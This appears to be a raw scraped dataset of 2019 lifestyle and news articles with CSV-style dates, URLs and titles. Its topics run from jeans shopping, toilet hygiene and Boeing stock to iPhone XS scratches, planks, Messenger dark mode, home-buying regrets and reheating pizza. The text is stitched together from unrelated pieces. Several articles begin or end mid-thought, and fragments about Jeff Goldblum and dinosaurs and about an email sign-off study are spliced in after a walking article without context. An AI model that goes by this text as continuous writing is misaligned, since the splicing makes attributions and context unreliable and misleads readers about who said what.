Bitter? You should take it up with a new study by UK-based delivery service CollectPlus. Their survey asked 2,000 Brits to share their shopping habits and wardrobe preferences—all the way down to their perfect pair of jeans.

Based on the final data, the researchers recommend ditching denim by the time you reach 53 years old. It’s not because you’re making a fashion faux pas, though. In truth, it just becomes harder to find a pair that fits by that age.

Sadly, the numbers spell bad news for denim devotees. One in 10 of respondents over the age of 50 reported trying on up to six styles before finding the perfect pair, the researchers said. The study also found that most people experience peak stress levels while jeans shopping by age 53. Six percent of shoppers even became so upset they burst into tears. (Sound familiar? Here’s how to find the best jeans for your body type.)

Of course, finding the perfect pair of blue jeans might as well be rocket science, no matter how old you are. In fact, research shows people spend an average of five to eight days searching for jeans. So it’s no surprise that most people don’t buy a new pair for another three years at minimum.

If you still want to rock your favorite pair of denims until you retire, we will cheer you on. But regardless of your age, you’ll want to steal these tricks to make cheap jeans look expensive.

Which Direction Should | Wipe?
",18/03/2019 10:05,https://lifehacker.com/how-to-correctly-wipe-your-butt-5805108,"Wiping your butt after using the toilet is one of those things most of us don’t think about on a regular basis—we just do it and get on with our day. But are you wiping correctly? Does it even matter? Lifehacker spoke with a few doctors to get to the bottom of the matter.

How it’s done now

From what I gather, the two major schools of wiping are front-to-back, with your arm reaching behind you from the side, or back-to-front, with your arm between your legs. There’s also another method, where it’s not exactly front-to-back/back-to-front, but more of a swirling motion, as if you were cleaning a dirty spot on a window. I’ve never actually seen this in practice, but to be fair, the number of times I’ve witnessed any of these methods executed by someone else can be counted on one hand. (And I washed that hand afterwards.)

The right way

The method of wiping your buttocks depends on what kind of equipment you have in the area. If you have a penis, dermatologist Curtis Asbury, M.D. says to “do whatever feels right. It makes no difference. Heck, you can go side to side if you like!”

But on the other hand, people with a vagina and vulva are definitely going to want to wipe front-to-back. Brian Bowes, M.D., an internal medicine physician explains why direction is so important for this part of the population:

The majority of cases of cystitis or urethritis are from E. coli, the normal flora that lives in your gastrointestinal tract. This helps you digest your food, but if you wipe from back to front you risk smearing it to your urethral meatus (pee hole). Then the bacteria get into a sterile environment [your pee hole] and cause a UTI. This was traditionally taught in medical school to be “honeymoon cystitis” as many women would get UTIs after their vigorous honeymoon weekend and come back with this normal infection.

Are Vaginal Probiotics Necessary? Probiotics have been one of the buzziest health trends of the past decade—though they’ve actually… Read more

As for people with a penis, Bowes has some thoughts on that, too:

...most have at least 6 inches (hopefully) between their anus and urethral meatus (opening at the end of their penis)...this protects them from urinary tract infections. Therefore anyone with a penis that they pee out of (not to exclude any sexes) is protected from E. coli and may feel free to wipe in whichever way that pleases them (not that it should be pleasurable).

Advertisement

So what about the science? One 2009 study of wiping after passing urine, showed a small increase in infection when wiping back-to-front. However, another study on college-age women with UTIs showed that there was no increase. Though there’s not a ton of research conducted specifically on the effects of different wiping methods, the professional medical consensus is clear: people with vaginas should definitely wipe front-to-back. In fact, the Mayo Clinic, Brigham and Women’s Hospital, the Cleveland Clinic and the University of California, San Francisco all note on their websites recommend front-to-back wiping for people with a vagina in order to prevent urinary tract infections.

And while we’re on the subject of wiping, what about those pre-moistened wipes that are popular but terrible for the environment? Asbury says that not only do you not need them, but they can also cause an allergic reaction:

Recent attempts at ultra-cleanliness have lead to a trend of using moist wipes rather than dry toilet paper to wipe. The main problem with this is the growing sensitivity to chemicals in the moist wipes. An allergy to these chemicals can cause pain, irritation, and redness which often causes the person to use the wipes more, and thus perpetuating the problem. The main chemical associated with moist wipe allergy is methylchloroisothiazolinone/methylisothiazolinone (MCI/MI or Kathon CG) although other common allergens in wipes include quaternium-15, iodopropynyl butylcarbamate, DMDM hydantoin and fragrances. Use moist wipes at your own risk, and at the very least, read the label!

Alternatives to wiping

So if there’s no reason to use moist chemical wipes, is there anything better than the traditional two-ply? If you guessed bidets, you’d be right, and you’ve probably used one before. But Chris Lowry, M.D., a physician and the director of MedRevise.co.uk, points out something interesting about long-term usage that I’ve never heard before.

Japanese toilets often contain a water jet and blow dryer that cleans the anus for you. Apparently, some Japanese doctors are now claiming to be seeing cases of “Washlet Syndrome” where cleaning that is too effective leads to problems such as weak sphincter muscles, dry skin and anal sores.

If you’re a DIY-er, you might be wondering what other things you can wipe with. Lowry recalls stories of a man who experimented on himself with such items as dried corncob, rocks, newspaper, leaves, and vinegar on a sponge. Ultimately, he found that while many of these methods do work in an emergency situation, that modern toilet paper is definitely your best bet.

Alternatives to traditional toilets

Pulling back one level from wiping, Lowry points out that squat toilets—the type you see in some Asian countries, might be healthier. But this could be also attributed to a high-fiber diet, rather than the method of evacuation. Also, as we poin ted out in a previous post, sitting in a squat position may help move things along, but there’s no evidence that it actually improves your overall health. And regardless of whether you sit or squat, you’re still going to have to wipe, so it doesn’t really change anything in that department.

It all started with a movie. Queen Elizabeth II worked with Sir David Attenborough on a documentary about creating forested parks in the Commonwealth in conservation efforts, and rumor has it the film sparked Her Majesty’s interest in going green.

Almost 300 million tons of plastic are produced every year, but they take more than 400 years to biodegrade. Over the last 60 years, only 9 percent of plastics has been recycled, while 79 percent—5.5 billion tons—is sitting in landfills or littering the environment.

In an effort to cut plastic waste, the Queen is taking matters into her own hands with some new house rules. “Across the organization, the Royal Household is committed to reducing its environmental impact,” a Buckingham Palace spokesman told the Telegraph. “As part of that, we have taken a number of practical steps to cut back on the use of plastics.” Guess that's just one more thing to add to these 15 surprisingly frugal habits of the royal family.

The royals aren’t just talking the talk, either. Staff aren’t allowed to use straws in dining rooms anymore, and straws are being phased out from public cafes such as Buckingham Palace’s Garden Café. Meanwhile, caterers at Buckingham Palace, Windsor Castle, and Edinburgh’s Holyrood Palace will be swapping out single-use dishes for china plates, and glasses or recyclable paper cups for plastic bottles. Royal Collection cafes will still have takeout options, but the containers will be biodegradable or compostable—no plastics to be found. “At all levels, there's a strong desire to tackle this issue,” the spokesman said. To follow Queen Elizabeth's lead, try these 12 simple ways to reduce waste every day.

What's the Difference Between Shamrock and Four-Leaf Clover?

Shamrocks have been a national symbol of Ireland for centuries and while every March 17th, St. Patrick’s Day revelers in the U.S. dress up in their green garb to watch parades and sip green drinks, too often they’re donning four-leaf clovers instead of shamrocks. We want to clear up any confusion about the difference between the two so you can celebrate the holiday accurately!

The History and The Legend

The old tale goes like this: St. Patrick used the abundant shamrock of the Emerald Isle to explain the holy trinity (Father, Son and Holy Spirit) in his work to convert Irish people to Christianity. And, even before St. Patrick popularized the shamrock (or, some would say that later writers and botanists popularized the tale of St. Patrick and the shamrocks), Druids used them for medicinal purposes. No matter how you look at the history, shamrocks have been a core part of Irish history and heritage for centuries and will remain a popular symbol for the foreseeable future. A four-leaf clover, on the other hand, is considered a good-luck token simply because it’s such a rare find. In some narratives, it’s the leaf of luck while the other three symbolize faith, hope and love. So, to be clear, the difference between a shamrock and four-leaf clover: the four-leaf clover is a charm of luck any time of year but it is not representative of Irish tradition and St. Patrick’s Day. For the Irish, it’s all about the shamrocks!

If you’re interested in good luck plants, then add one of these 12 to your home!

Make your garden pop this year with one of these 10 inexpensive plants.

The Science

Shamrock, or “seamrag” in Gaelic, means “little clover” which is so fitting because shamrocks and flour-leaf clovers belong to the white clover plant family (although there is debate in the botanist community about which plant family shamrocks truly belong to.) You can easily spot the difference between the two because shamrocks have three leaves (or leaflets, technically) while four-leaf clovers have, obviously, four leaflets. It takes a rare genetic mutation to get that extra leaf which is why it’s so difficult to find a four-leaf clover. Research places the difficulty at 1/10,000, so if you’re trying to find one of your own, you’re going to need to scan an area of about 1.2m² (roughly the size of an office desk) according to Scientific American’s editor Eric R. Olson. Good luck!

That model has since been grounded by the Federal Aviation Administration, as well as by aviation regulators around the world.

Still, if you invested in Boeing 10 years ago, that decision would have paid off: According to CNBC calculations, a $1,000 investment in 2009 would be worth more than $14,000 as of March 15, 2019, a total return over 1,000 percent. In the same time frame, by comparison, the S&P 500 was up 270 percent.

Any individual stock can over- or under-perform, however, and past returns do not predict future results. Boeing paused delivery of 737 Max planes after the Ethiopia crash, which came less than five months after another deadly crash in Indonesia involving the same model.

This left several major airlines, including United, American and Southwest scrambling to rebook passengers and reassign planes. Those companies said they would waive ticket-change fees and fare differences for those affected by the FAA's grounding order.

Flight-booking site Kayak even introduced a new search feature that allows users to exclude specific plane models, according to co-founder and chief executive officer Steve Hafner.

CNBC: Boeing stock as of Mar. 15, 2019

Fortunately for Boeing, while shares plunged more than 10 percent early this week, they ticked back up by as much as 3 percent Friday. And the company announced plans to roll out a software fix in the next few weeks.

Though, Bank of America analyst Ronald Epstein said Thursday that the fix could take a lot longer: ""Once Boeing identifies the issue … the most likely scenario is the company will take about 3-6 months to come up with and certify the fix,"" he said in a note.

Hafner says he expects the 737 Max models to be grounded only a few months and that travelers will likely be booking flights on them again soon: ""They're out of service on a temporary basis,"" he said on CNBC's ""Squawk Alley."" ""In reality, airlines are still planning on flying those planes in the summer. People want security and comfort when they fly.""

In the meantime, Boeing said in a statement it will ""continue to build 737 Max airplanes, while assessing how the situation, including potential capacity constraints, will impact our production system.""","If you invested $1,000 in Boeing 10 years ago, here's how much you'd have now",

Yes, You Can Lose Weight Walking as Little as 30 Minutes a Day
— but There's a Catch
",15/03/2019 13:31,https://www.popsugar.com/fitness/Can-You-Lose-Weight-Walking-Hour-Day-45792193,"If you're on a mission to lose weight but don't have the time or energy for a more intense workout, walking is a great place to start. And with fitness trackers and GPS apps readily available on our phones, it's easier than ever to track your steps, time, or distance whenever you hit the pavement.

So, let's say you walk for an hour during the day: will you lose weight? One study in JAMA Internal Medicine showed that subjects who, without making changes to their diet, worked out at a rate equivalent to walking 12 miles per week for eight months saw fat loss. The authors further stated that the controls in this experiment gained weight, but that could be reversed with 30 minutes of daily walking.

Plus, exercise physiologist Tom Holland, MS, CSCS, told POPSUGAR in a previous interview that you can certainly see weight-loss results by walking just 30 minutes per day. He recommends that true beginners start with walking three to four times per week, then increase from there. But, just how effective your workout is depends on a number of factors.

""The intensity at which you walk plays a key role in helping your body burn more calories and improve your cardiorespiratory system,"" Denise Miklasz, an ACE-certified personal trainer at Northwestern Medicine Crystal Lake Health & Fitness Center, told POPSUGAR.

If you're walking at a casual stroll, you're probably not going to achieve the weight loss you want. One way to pick up the pace? ""You could include 30- to 60-second bursts of faster walking every three to five minutes, followed by a 30-second recovery walk,"" Miklasz said. You can also try walking with weights or picking a route with hills to add some intervals to your workout.

""An interval-training workout will continue to burn more calories after your workout due to a physiological effect called excess post-exercise oxygen consumption, or EPOC. EPOC is sometimes referred to as the 'afterburn effect,'"" Miklasz explained.

Even more important is your diet. You know this, but you can't eat whatever you want or as much as you want the second you start exercising. ""In order to lose weight you need to create a calorie deficit,"" Miklasz said. One pound is equal to 3,500 calories, so you'd need to carve out 3,500 calories each week in order to lose one pound, which experts consider a safe and healthy goal. In other words, ""you need to either burn an extra 3,500 calories or remove 3,500 calories from your diet,"" Miklasz explained — or a combination of the two.

""Combining exercise with a healthy diet is more effective than restricting calories alone. Exercise can help you maintain and increase lean body mass, which results in a larger calorie burn per day,"" Miklasz said. To that point, when you're ready to start building muscle, remember that walking alone won't cut it. She noted, ""Ideally, incorporating strength training along with aerobic exercise will increase muscle mass and boost your metabolism.""

Of course, actor and pop culture icon Jeff Goldblum had a pretty strong opinion on these scientist's work:

The reasons to avoid modern-day dinos are pretty obvious:

Maybe instead of bringing back dinosaurs we should save ourselves and the other animals living on the planet?

It's possible to get data to tell you anything.

I confess, though, that I was rendered temporarily insensate by some data that wafted beneath my eyes today and refused to leave.

For reasons that were, no doubt, well intentioned, an Atlanta-based company called SalesLoft -- which offers, oh dear lord, ""sales management solutions"" -- decided to ""deconstruct"" millions of emails to see whether some content was more effective than ""Hi, I hope you're well.""

I can't imagine how you deconstruct an email. Probably in the same way a fancy chef deconstructs peach flambé.

The results of SalesLoft's deconstruction, however, shiver on an axis between exciting and numbing.

What might move you is that subject lines with just one word outperformed the average by 87 percent.

I think I'll try a one-word headline for an article very soon. My favorite right now is ""panic.""

Oddly, this deconstructive study insisted that any numbers in a subject line reduced the response rate by 32 percent.

Even more oddly, emails containing the word ""referred"" in their subject line enjoy a 536 percent greater response rate.

Emails with fewer than 50 words apparently showed a response rate 40 percent greater than average.

Perhaps you're already moved by some of this blinding fascination.

I, though, am still bathing in another result from the study.

It seems that if you write ""Cheers"" as your sign-off, it increases the response rate by 8 percent.

I find this particularly painful.

Because I grew up on the older, more decrepit side of the Atlantic, Americans seem to believe I want to end conversations or written communications with ""Cheers.""

It's so very British, after all.

Sadly, I'm not that sort of British. Indeed, my blood is Polish and it boils every time I see someone shove this word in, perhaps in an attempt at peculiar assimilation.

Naturally, I asked SalesLoft whether, perhaps, it had deconstructed a vast trove of British emails.

The company told me that the data was representative of its client base, which is predominantly American.

There must be quite a few Americans who believe talking British -- rather than ending an email with, say, ""Thanks"" -- will get them somewhere.

Ultimately, though, I can now feel more sanguine.

It could be that these people are ending their emails with ""Cheers"" because they want an 8 percent higher chance of a response.","Adding This 1 Ridiculous Word Will Improve Your Email Response Rate by 8 Percent, Says a New Study",

Four years and over 3 million Instagram followers later, Lee is at the helm of a dermatological empire, which includes her own reality show on TLC, a new book, a skin care line that just launched a range of new products, and a massive following that loves her as much for her pleasant bedside manner as they do for her popping prowess.

Lee’s rise to viral skin-repairing-sensation status and fame happened fast ― and shows no signs of slowing down. She recently dropped by HuffPost to chat about the impact fame has had on her professionally and personally, why she thinks people are so obsessed with her videos, and the things that gross her out way more than a cyst ever could.

It really pulls on emotions for people. It’s so interesting because something that is based on something gross and shocking actually makes people happy. It relaxes them, it decreases their anxiety, it’s thrilling. And when people like it, they don’t just like it ― they’re obsessed.

Myself included. There’s something so satisfying about it.

That’s really how it grew ― it created this reaction. If it created distaste or people really loved it, either way they would tag their friends and that’s how it grew so quickly.

Has doing your job changed since becoming a viral sensation and launching your reality show?

Dermatology is very competitive to get into because of the lifestyle. You definitely deal with complicated issues, but you don’t often deal with life-threatening ones, nor do you get calls in the middle of the night. It’s a lower-stress kind of specialty medicine, but this has definitely upped it a notch.

How so?

Before, I maybe removed 10 cysts in a year. Now it’s like 10 within a few days. It’s changed the things that I do, and the show has changed it to a different level too where we’re moving much bigger things on a regular basis. It’s challenged me, but I feel a sense of accomplishment and it’s made me proud to represent dermatology.

You don’t realize how much is involved with the show: the whole [office] kind of was torn apart and changed. We had to change the color of the rooms. [The crew is] really careful and considerate, but there are just a lot more people walking around now. I have to make sure my patients aren’t upset or affected.

Was there ever a time you thought about ending the show because of that?

The first season I was not having a good time. It was a really big deal for me to do it in the first place because I knew it meant giving up control. On YouTube and social media, I get to decide what’s on there, so to give the control to someone else was really hard. It was also extremely stressful for me because the most important thing to me is the patients and how they do and that I’m giving them the best care possible. I know ultimately the show cares about entertainment. They care about me and the patient of course, but not the same way I do. So it was really stressful. It was an adjustment, but I’m really proud of the show. I’m learning to enjoy it more now.

How has fame affected your personal life?

It’s awkward for me and it’s hard to get my mind around. I’m so aware that I don’t want to come off as not being the person I am on my show because I feel I am that person, but I’m also shy! I don’t feel like I deserve this adulation or reaction from people when they come up to me and say such nice things. I’m not the kind of person who says, “Oh, thank you, yes, that’s me,” and so I feel like maybe I come off as cold or not friendly. I’m trying to work on it. I say “thank you” and take a photo. I try to do that, but it’s uncomfortable.

Even when that person, say, asks for an impromptu skin check on the street?

People did that before the show too. It’s just part of what you do. Usually if I’m with someone and they ask, I answer them ― what are you going to say, no? But sometimes it’s awkward if they want to show me a body part that’s under their clothes, and you know, technically you shouldn’t make a diagnosis like that [on the street]. It’s a liability.

I’ve found that no matter what your profession is, everyone wants something.

Plumbers, electricians, lawyers ― everyone wants advice. My husband and I were on a cruise early on in our marriage and were set up with another couple for dinner. On the way to the first dinner my husband said, “You know what? Let’s not tell them we’re dermatologists.” I was like, “We can’t do that! We’re sitting next to them ― we’re gonna talk to them every day.” Then I said, “Maybe we should just say we’re in the XXX industry, something that will make them be quiet,” but then I thought if they were in that industry we would get caught in a lie [laughs].

We finally made a deal that I would take one for the team and say I’m the dermatologist and my husband is the office manager. Now that’s what we say every time we go somewhere.

You (and your millions of fans) say that watching popping videos actually relieves anxiety and relaxes people. But what do you watch to relax?

Mukbangs! I’m just amazed at how much food they’re eating and that they’re making money off this on camera, just talking about their lives and eating a huge vat of noodles. It’s crazy.

OK ― last thing I have to ask. Are you ever grossed out by anything you see at work?

No, but the funny thing is that it doesn’t mean things don’t gross me out. I’m plenty grossed out by other bodily functions ― diarrhea, vomit. I’m more grossed out by like, feet, than cysts and things.",Here's The Thing That Grosses Dr. Pimple Popper Sandra Lee Out More Than Cysts,

Why | Regret Upgrading to an iPhone XS
",12/03/2019 9:21,https://gizmodo.com/why-i-regret-upgrading-to-an-iphone-xs-1832653430,"I’ve had my iPhone XS for a little over three months, and it’s driving me crazy. Not the whole thing. The phone is beautiful, fast, a joy to use. What’s driving me crazy is an increasingly complex network of scratches on the display glass. The first ones were small, almost unnoticeable at a glance. Then, about six weeks after I spent well over $1,000 upgrading to the iPhone XS, a ribbon-shaped abrasion appeared on the screen and then another. The worst part is that Apple is pitching a fit about fixing it.

Before you cast too many judgments, let me own up to a few facts about how I treat my phone. I don’t use a case. I never lay it face-down on a surface. Frankly, I baby the thing, because it costs as much as a cheap used car, and I’m an unusually anxious person who can’t stand the sight of the smallest ding or crack.

That was the crux of a post I wrote last year, after noticing how easily the iPhone X screen developed scratches. But the iPhone XS was supposed to be better, more durable. Apple said it had the “most durable glass ever on a smartphone.” Apple said that about the iPhone X, too, although the company has never fully explained what that claim means. I can’t imagine it means that the new glass is more scratch resistant than what’s been on earlier iPhones, because I’ve never had so many issues with surface scratches as I had on my iPhone X and, now, my iPhone XS.

In retrospect, I never should have upgraded. My iPhone XS review actually made it pretty clear that the X-to-XS jump didn’t make much sense because the new iPhone is almost identical to its older sibling except for the new phone’s beefier processor, better cameras, improved antennas, and according to Apple, more durable glass. Plus, all these new iPhones are built to be more future proof than any iPhone ever. The glass thing hooked me, though. I’d cracked the back glass on my iPhone X, and while that could be repaired, I figured more cracks were inevitable. Plus, having very publicly complained about the scratch-prone screen on the iPhone X, I figured the slightly better performance coupled with the improved durability would make sense for what I wanted to do: buy one iPhone and keep it for four or five years.

The other thing that hooked me was the Apple Upgrade Program, which I joined in 2016. The program lets you get a new iPhone through an interest-free loan that you pay down in 24 monthly installments, which include the cover the cost of the device as well as AppleCare. After a year, you can trade in your device for a new iPhone. If you don’t want to upgrade, you just pay off the loan in two years, at which point, the iPhone is yours free and clear. So when the iPhone XS came out, I was faced with the option of keeping my iPhone X, paying down the loan for another 12 months, or I could upgrade to the iPhone XS, start a new loan, and end up owning a better device after another two years.

Advertisement

This doesn’t mean that you can upgrade for free. For one, upgrading means you lose all the equity you built up on the one phone. I used to own half of an iPhone X. I essentially traded that in for the privilege of getting an iPhone XS. On top of that, I had to pay sales tax and an upgrade fee to Verizon. I also had to pay a $100 incident fee for the crack on the back of my iPhone X, which was a bit of a surprise, since I figured AppleCare would cover a single crack. So although my monthly payment remained when I got the new one, the upgrade ended up costing me a few hundred dollars in the grand scheme of things.

And then I got these scratches! It’s hard for me not to sound like a brat, since screen scratches can be easily avoided by using a screen protector and a case. The fact of the matter is, no matter how much anyone babies their phone, glass is bound to scratch. I guess I just sort of hoped I could enjoy a pristine screen for more than a month before my expensive new iPhone XS developed a whole network of them—just like my iPhone X had.

Unfortunately for me, AppleCare can’t solve my scratch problem. In multiple conversations with both Genius Bar employees and Apple Support, I was told that surface scratches were treated as cosmetic damage and were not covered. One Apple employee slyly suggested that if my screen somehow developed a crack in it, I could get the entire display replaced for just $30. If I just wanted to replace the display as it was, scratches and all, Apple would charge me $280. And replacing the display would be the only way to rid myself of the scratches. There was no magical buffing machine in the back of the Apple Store and no way to replace the glass itself.

I seriously considered taking a hammer to the screen. Just one crack and I’d get a brand new flawless screen for the price of a pizza dinner. Here at Gizmodo, however, we do not encourage or condone the destruction of gadgets for personal gain. Plus, it’s a pretty daft idea to break an iPhone on purpose.

So I’m stuck with the iPhone XS, and I’m stuck with the scratches. And because the screen is scratched, I feel very pessimistic about the resale value. This makes me want to double down on my initial ambition to keep the phone for five years. And if I want to avoid any more dumb damage, I’d have to get a case. After years of gleefully flitting through life with a naked iPhone, I must finally become a case person.

There are a million options for iPhone cases, and I tried a range. I tested a goofy leather case that makes your phone look like the classic Adidas Samba soccer shoe. I spent time with the latest $100 Mophie charging case which made my phone feel like a dull brick. I also tried both of the Apple-branded iPhone XS cases, and using those helped me realize that I wanted a case that would be as minimal as possible.

So my main goal became finding a case that left the iPhone XS feeling as close to case-free as possible. Maybe unsurprisingly, the Apple-made cases almost did it for me. Both the leather and silicone versions fit snuggly enough to slide into my jeans pocket easily, and I like that they have raised buttons for volume control and power. What I really don’t like about the Apple cases as well as a lot of other third-party cases was the extent to which the sides of the case create little ridges around the phone screen. So when I swipe across it, I end up bumping into these instead of smoothly sliding off the edge in the pleasing, slalom-like fashion you get with a case-free iPhone.

I ultimately settled on a company called Peel. “Case” is almost too big a word to describe what Peel makes. They’re basically super-thin plastic skins that snap on to your phone and provide the slightest amount of protection. Peel also makes a low-profile glass screen protector that successfully hid my scratches, when I installed it. The Peel case costs $30, as does the glass screen protector. So for the $60, I had a somewhat protected iPhone XS and newly scratch-free screen. Which is a heck of a lot cheaper than the $280 screen replacement that Apple wanted me to get. For reference, the cheaper silicone case made by Apple costs $40, and the Belkin InvisiGlass Ultra screen protector that Apple will install in their stores using special machines costs $40.

Now that it’s safely wrapped in a minimalist case and sealed with a glass screen protector, my iPhone XS sort of feels new again. It also reminds me that my iPhone X would have felt exactly the same in the same $60 skin. Yes, the iPhone XS has a better processor, though I don’t think anything I do with it requires as much power as it offers. Yes, the XS camera is slightly better, though I don’t even notice the difference when taking pictures of my dog (which is mostly what I use the camera for). Yes, Face ID is a fraction of a second faster. But unfortunately, the iPhone XS just didn’t end up being as durable as I thought it would be. It definitely doesn’t feel more durable than my iPhone X did.

Looking back at my decision to upgrade, I realize that regret was inevitable. On a practical level, it was a cavalier thing to do. I didn’t need a new iPhone. The one I had was banged up, sure, but it worked just fine. I wanted a new phone, though, and Apple made it so easy to take the leap that I shuffled the sketchy economics of upgrading into the back of my head, letting the promises of Apple’s marketing team hold my attention.

I should have known better. Even if my iPhone XS were still in mint condition, I think I’d be second-guessing my decision at this point. Unlike my last upgrade from an iPhone 7 to an iPhone X, my life did not meaningfully improve when I got the iPhone XS. The fact that it got banged up so quickly, too—well, that makes me regret the regrettable decision to upgrade even more.

It’s not the end of the world. I spent money I could have saved, but I do hope this extended, hand-wringing confessional might be helpful to any iPhone X owners who might be considering bumping up to the newest model. Then again, Apple will be announcing another new iPhone in six months. And then another one a year after that. You don’t need to buy any of them, and I hope I don’t. At least, not until this scratched up iPhone XS sees its fifth birthday. Then, maybe it will be worth it.",Why I Regret Upgrading to an iPhone XS,

This Is Exactly How Long You Need to Hold a Plank to Flatten Your
Belly
",11/03/2019 15:18,https://www.thehealthy.com/exercise/how-long-to-hold-plank/,"All hail the plank! But wait: How long should hold one? Here's your answer

Yes, you might have mastered the plank upgrades that can reshape your body. But there’s just one catch: While the act of planking is pretty straightforward, how long you should actually hold a plank is probably a bit less clear. Thankfully, the experts have you covered.

To reap the most rewards, holding three planks for up to 60 seconds each is ideal, according to Doug Sklar, a certified personal trainer and founder of PhilanthroFIT in New York City. “Holding a plank for 60 seconds with good form demonstrates an ability to utilize your core muscles under control for roughly the amount of time you may be performing other exercises,” Sklar says. (To switch up your plank game, check out these four easy plank exercises that will transform your abs.)

However, keep in mind that if you’re new to planking, you don’t want to risk injuring yourself in the name of a slimmer waistline. “As with any exercise, proper form reduces the risk of injury. Allowing your hips to drop puts you at risk of hyperextension of the spine which can result in back pain,” Sklar explains. “Imagine a straight line through your body passing from your ears through your shoulder, hips, knees, and down to your ankles.”

Refine your plank form

Albert Matheny, RD, CSCS, co-founder of SoHo Strength Lab and nutritional advisor to Promix Nutrition, breaks the form down further: Keep your fingers spread and hands shoulder-width apart, with wrists at a 90-degree angle and shoulders directly over wrists. Push the ground away from you as much as possible, and pull your shoulders away from your ears. Try to keep your feet and legs together. Squeeze your glutes and tighten your abs, so your hips tuck under and your low back flattens. Keep your neck in a neutral position.

If you have trouble maintaining this position, start with shorter plank holds, focusing on good form for five to 10 seconds. And then, as you maintain strong form and good posture, gradually increase that time, Sklar suggests. Aim for a set of three (holding for 10 seconds) and see if can maintain your body position before holding for longer. Also, don’t worry about losing out on any gains in the meantime; planking for shorter periods of time can still amount to a solid workout.

On the flip side, holding a plank for one minute might be a breeze for you. If that’s the case, Matheny recommends increasing the difficulty by adding some movement to the plank. Try tapping your shoulder with your opposite hand or driving your knees in, one at a time, for mountain climbers. (Also, try this one exercise that will give you a flat stomach in 10 minutes.)

Remember this for all plank variations: “Without proper form, you are not working your muscles, you are just putting stress on your joints or spine which can lead to injury,” Matheny says. “If you are not actively holding tension in your plank you are either relying on your joints/stacking of bones to keep your position, not your muscles.” So keep your full body strong.

Tired of the same old plank position? Mix up your workout routine with these exercises that flatten your belly—without a single crunch. Or skip the gym completely and turn to a few flat-belly tricks that don’t require a lick of exercise. You’ll be on your way to a stronger, toned core in no time.",This Is How Long You Need to Hold a Plank to Help Flatten Your Belly,

It's was hidden away in earlier versions and you needed to either run a root hack or send a moon emoji to activate it — but now, you can enable dark mode by toggling a simple switch in Facebook Messenger's settings.

Enabling Dark Mode

To begin, make sure you're running the latest version of Facebook Messenger (version 210.0.0.24.97 or higher). You can update the app by heading to your phone's respective app store, or you can tap one of the links below and select ""Update.""

Update Facebook Messenger: Android (free) | iOS (free)

Now, open Messenger and tap either the silhouette icon or your profile picture in the top-left corner of the main screen to open the app's settings. From there, just enable the ""Dark Mode"" toggle switch towards the top of the menu — it's as simple as that!

Once enabled, it's a true black dark mode, so you'll save battery life on phones with OLED screens like the iPhone XS or Galaxy S10. The theme was a work in progress previously, but now, it seems to be complete. So no more issues where there's black text overlaid on a black background — instead, it's a fully functional true dark mode for Messenger.

It's worth noting that Messenger's dark mode operates separately from the system-wide dark mode toggles on Android 10 and iOS 13. And if you're using Smart Invert to fill in the dark mode gaps on your iPhone, know that it will turn Messenger white again if the app's dark mode is enabled.",How to Activate Dark Mode in Facebook Messenger,

63% of millennials who bought homes have regrets—usually
because they missed this step
",10/03/2019 15:03,https://www.cnbc.com/2019/02/28/63-percent-of-millennial-homebuyers-have-regrets-heres-why.html,"Millennial homeownership has been off to a slow start. Roughly 1 in 3 millennials under the age of 35 own a home as of the end of 2018, according to the U.S. Census Bureau. That's 8 to 9 percentage points lower than previous generations' homeownership rates at ages 25 to 34, according to research from the Urban Institute's Housing Finance Policy Center. Yet many of the younger people lucky enough to own a place still suffer from buyer's remorse. Nearly two-thirds, or 63 percent, of millennials (ages 23 to 38) say they have regrets about purchasing their current home, according to a new poll of about 1,500 homeowners from Bankrate. Only 35 percent of baby boomers (ages 55 to 73) say the same, while about 50 percent of Gen Xers (ages 39-54) cop to some remorse.

The top reason millennials have regrets

Underestimating the hidden costs associated with buying and owning a home, including the ongoing responsibilities of maintaining it, is the No. 1 millennial homeowner frustration. It's a common mistake, experts say, and it can be a costly one. You need to know that you can truly afford to both buy and own a home, and to get the full picture, you need to do more than simply compare your current rent payment with the potential mortgage payment, Daryl Fairweather, chief economist at real estate site Redfin, tells CNBC Make It. ""Do a full check of all finances,"" Fairweather says. ""A lot of hidden fees come with owning a home that you might not consider immediately."" That includes the insurance, property taxes and closing costs — which can be 2 to 5 percent of the home price. Those kinds of hidden costs even tripped up real estate mogul Barbara Corcoran early on. ""When I bought my first home I showed up at the table to close without the closing costs,"" she told CNBC Make It. ""Thank God I was able to borrow it from the very nice seller or I couldn't have closed on the place.""

First-time buyers also often overlook the costs of upkeep and repairs. HGTV recommends buyers plan to spend 1 to 3 percent of the home's purchase price on annual maintenance. So if the home is priced at $300,000, your budget for this should be at least $3,000 each year. It doesn't help that cash-strapped millennials often struggle to afford just the down payment: Roughly 1 in 3 millennial homebuyers took on a second job to save up for it. ""When paying for things like mortgages and student loans, [millennials] don't have much money to save for the hidden costs of owning a home,"" Fairweather says. The key to avoid regrets in the long run is to play it safe at the outset, Lawrence Yun, chief economist of the National Association of Realtors, tells CNBC Make It: ""Start with a starter home and later trade up, rather than going for a 'dream home' on the first try.""

There's a 'shortage' of starter homes

Unfortunately, though, many millennial homeowners end up paying more than they wanted to or had budgeted for because there aren't many homes available at the prices young people can comfortably pay. ""Millennials have seen their rents go up year after year, and may think that buying a home is more affordable, but the fact of the matter is housing has become unaffordable across the board,"" Fairweather says. In many cities around the U.S., particularly in coastal areas, home prices are out of reach. Only 67 percent of homes available in 2018 located in metro areas tracked by Redfin were priced affordably for millennials — down from 71 percent of homes in 2017. In Los Angeles, only 19 percent of homes are in a price range that millennials can afford, based on their median incomes. ""We need more affordable-priced homes, and the shortage of these properties are forcing people to possibly over-stretch their budget,"" Yun says.

Pizza

Because if there are, we haven’t met them yet. When it comes to leftover ‘za, the only debate we’ve ever had with our friends is whether or not it should be heated. Many folks are of the mindset that all leftover pizza should be eaten cold for the full, genuine, leftover experience. And besides, reheated pizza—which is often pathetically revived in a microwave oven—is usually soggy, chewy, and altogether unappetizing.

It seems you just can’t have your day-old pizza pie and eat it, too.

But after reading about a reheating method that recently went viral over on Reddit, even the most devoted cold-pizza lovers among us would agree: It sounds like it’s worth a try.

Reddit user KevlarYarmulke shared the easy-to-follow instructional guide for reheating pizza the right way, which they claim to have found on a take-out menu from Roberta's pizzeria in Brooklyn. The method is simple, and all you need is a slice of cold pizza, a skillet, a lid, and some water.

First, you cook the pizza in the skillet on medium-low heat for 2 minutes to get it nice and crispy again (and warm!). Next, you put two drops of water into the pan, not too close to the slice itself, reduce the heat to low and cover the skillet for one minute so that it gets steamy. This allows the cheese on top to melt a bit and become gooey.

